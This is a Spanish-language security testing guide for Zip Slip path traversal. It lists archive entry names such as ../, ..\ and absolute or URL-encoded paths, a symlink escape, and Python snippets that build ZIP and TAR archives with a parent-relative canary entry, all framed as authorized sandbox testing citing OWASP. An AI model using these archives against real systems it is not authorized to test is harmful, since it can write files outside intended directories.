# 🗡️ Zip Slip: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Nombres de entrada que salen de la raíz

```text
../canary-{NONCE}.txt
../../canary-{NONCE}.txt
..\canary-{NONCE}.txt
/tmp/canary-{NONCE}.txt
```

**Cuándo usarlo:** Son nombres dentro del archivo comprimido, no URLs. Las barras inversas importan sobre todo en Windows; algunas librerías eliminan la barra inicial. Usar sandbox y canary nuevo.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).


### Crear un ZIP con canary de recorrido

```python
import zipfile
with zipfile.ZipFile("canary-{NONCE}.zip", "x") as z:
    z.writestr("../canary-{NONCE}.txt", "prueba controlada")
```

**Cuándo usarlo:** Extraer solo en laboratorio; comprobar ruta final normalizada y ausencia de sobrescritura.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).


## 🧭 Payloads por contexto

### TAR con una entrada relativa al padre

```python
import io, tarfile
with tarfile.open("canary-{NONCE}.tar", "x") as tar:
    data = b"prueba controlada"
    info = tarfile.TarInfo("../canary-{NONCE}.txt")
    info.size = len(data)
    tar.addfile(info, io.BytesIO(data))
```

**Cuándo usarlo:** Una aplicación puede usar librerías distintas para ZIP y TAR; verificar ambos solo si los acepta.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).


## 🔥 Payloads avanzados

### Escape por symlink de laboratorio

```text
Raíz: ./salida
Symlink propio: ./salida/enlace -> ../
Entrada ZIP: enlace/canary-{NONCE}.txt
```

**Cuándo usarlo:** La validación debe considerar la ruta final real. No apuntar a archivos preexistentes.

**Fuente:** [Android Developers](https://developer.android.com/privacy-and-security/risks/zip-path-traversal).


## 🔬 Pruebas guiadas por escenario

### 1. Entrada ZIP con ../

**Objetivo:** Comprobar si el extractor confina rutas relativas.

```python
import zipfile
with zipfile.ZipFile("canary.zip", "w") as z:
    z.writestr("../canary-{NONCE}.txt", "prueba controlada")
```

**Interpretación:** Extraer solo en sandbox propio y comprobar si el canary queda fuera de la carpeta prevista.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).

### 2. Dos niveles de salida

**Objetivo:** Comprobar normalización de varias referencias al padre.

```text
Entrada de archivo dentro de ZIP: ../../canary-{NONCE}.txt
```

**Interpretación:** La ruta debe rechazarse o quedar dentro de raíz normalizada; crear únicamente archivo inocuo.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).

### 3. Separador Windows

**Objetivo:** Probar si un extractor en Windows interpreta barras inversas.

```text
Entrada de archivo dentro de ZIP: ..\canary-{NONCE}.txt
```

**Interpretación:** En Unix la barra puede ser un carácter literal; confirmar sistema y ruta final.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).

### 4. Ruta absoluta

**Objetivo:** Comprobar si el extractor acepta una entrada absoluta.

```text
Entrada de archivo dentro de ZIP: /tmp/canary-{NONCE}.txt
```

**Interpretación:** Solo en laboratorio propio. Algunas librerías eliminan la barra inicial; verificar el archivo real.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).

### 5. Entrada TAR traversal

**Objetivo:** Repetir el control de rutas en formato TAR si está admitido.

```python
import io, tarfile
with tarfile.open("canary.tar", "w") as t:
    d=b"prueba controlada"
    i=tarfile.TarInfo("../canary-{NONCE}.txt"); i.size=len(d)
    t.addfile(i, io.BytesIO(d))
```

**Interpretación:** Algunos extractores manejan ZIP y TAR con bibliotecas distintas; no asumir el mismo resultado.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).

### 6. Orden de normalización

**Objetivo:** Probar doble codificación únicamente si la aplicación decodifica nombres.

```text
Entrada ZIP: %2e%2e%2fcanary-{NONCE}.txt
Control: ../canary-{NONCE}.txt
```

**Interpretación:** Un extractor ZIP estándar trata % como literal. El caso es relevante solo con decodificación adicional.

**Fuente técnica:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/).

### 7. Comprobación del destino final

**Objetivo:** Validar defensa frente a enlace simbólico preexistente en el sandbox.

```text
Raíz de extracción: ./salida
Enlace propio: ./salida/enlace -> ../
Entrada ZIP: enlace/canary-{NONCE}.txt
```

**Interpretación:** Solo entorno propio. El extractor debe resolver ruta final y evitar escapes por symlink.

**Fuente técnica:** [Android Developers](https://developer.android.com/privacy-and-security/risks/zip-path-traversal).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
